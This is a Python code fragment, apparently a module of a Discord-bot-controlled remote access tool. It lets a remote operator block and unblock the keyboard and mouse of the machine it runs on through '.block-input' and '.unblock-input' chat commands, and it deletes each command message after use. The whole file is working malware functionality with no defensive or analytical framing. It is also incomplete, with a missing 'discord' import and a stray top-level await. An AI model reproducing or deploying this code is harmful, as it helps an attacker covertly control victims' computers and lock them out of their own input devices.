from pynput import keyboard, mouse

class Listeners:
    def __init__(self):
        self.keyboard_listener = keyboard.Listener(suppress=True)
        self.mouse_listener = mouse.Listener(suppress=True)
        self.is_running = False
        self.initialized = False

    def start(self):
        if not self.is_running:
            self.keyboard_listener.start()
            self.mouse_listener.start()
            self.is_running = True
            self.initialized = True

    def stop(self):
        if self.is_running:
            self.keyboard_listener.stop()
            self.mouse_listener.stop()
            self.is_running = False

listeners = Listeners()

async def handle_block_unblock_input(message):
    title, content, colour = '', '', discord.Colour.red()
    await message.delete()  #.log Removed the message
    if message.content == '.block-input':
        if not listeners.is_running:
            listeners.start()  #.log Disabled keyboard & mouse
            title, content, colour = "🚫 Input Blocked", 'Input has been blocked. Unblock it by using .unblock-input', discord.Colour.red()
        else:
            title, content = "🔴 Hold on!", 'The input is already blocked. Unblock it by using .unblock-input'

    elif message.content == '.unblock-input':
        if not listeners.initialized:
            title, content = "⚠️ Warning!", 'Use .block-input first before using .unblock-input'
        elif listeners.is_running:
            listeners.stop()  #.log Unblocked keyboard & mouse
            title, content, colour = "🟢 Input Unblocked", 'Input has been unblocked. Block it by using .block-input', discord.Colour.green()
        else:
            title, content = "🔴 Hold on!", 'The input is not blocked. Block it by using .block-input'

    embed = discord.Embed(title=title, description=f'```{content}```', colour=colour)
    return await message.channel.send(embed=embed)

# on message
if message.content in ['.block-input', '.unblock-input']:
    await handle_block_unblock_input(message)
